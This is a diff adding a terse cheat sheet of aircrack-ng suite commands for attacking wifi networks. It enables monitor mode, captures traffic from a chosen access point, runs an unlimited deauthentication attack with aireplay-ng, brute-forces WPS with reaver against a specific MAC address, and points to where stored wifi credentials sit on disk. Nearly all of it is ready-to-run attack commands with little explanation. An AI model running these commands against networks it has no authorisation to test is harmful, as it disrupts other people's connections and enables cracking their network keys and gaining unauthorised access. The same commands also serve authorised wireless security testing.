@@ -1,0 +1,69 @@
+# ------------------------------------
+# avahi daemon
+# ------------------------------------
+
+# check status of avahi daemon
+systemctl status avahi-daemon.service
+
+# disable avahi
+systemctl disable avahi-daemon.service
+
+# stop avahi
+systemctl stop avahi-daemon.service
+
+
+# ------------------------------------
+# Network manager
+# ------------------------------------
+# 1. Be sure to stop all connection managers prior to using 
+# the aircrack-ng suit
+systemctl stop NetworkManager.service 
+
+# 2. Make sure that wpa_supplicant is not running
+
+
+
+# Enable monitor mode
+# monitor mode is the equivalent of promiscuous mode
+airmon-ng start wlan0
+
+# capture
+airodump-ng wlan0mon
+
+# store captured packets in a file
+airodump-ng wlan0mon --write name_of_file
+# limit data capture to a single AP (channel 8 )
+airodump-ng -c 8 --bssid 00:14:6C:7A:41:20 -w capture wlan0
+# multiple channels
+airodump-ng -c 1,6,11 wlan0
+
+
+# Launch death attack
+# BSSID == MAC address of AP
+aireplay-ng --deauth 0 -a BSSID here mon0
+
+# Fix mon0 on a channel
+airodump-ng mon0 -w anynamehere -c 1
+
+
+# Testing if your Wifi adapter support packet injection 
+aireplay-ng -test wlan0mon
+
+# show the operating mode of your Wifi card
+iwconfig
+
+# Using reaver
+reaver -i wlan0mon -b 00:25:86:C6:05:1A -vv
+
+
+# change mode of interface card
+iwconfig eth0 mode Monitor
+
+# get information about accesspoints
+sudo iwlist scan
+
+# Where are the wifi credentials stored.
+/etc/sysconfig/network-scripts/keys-<ssid>
+
+
+
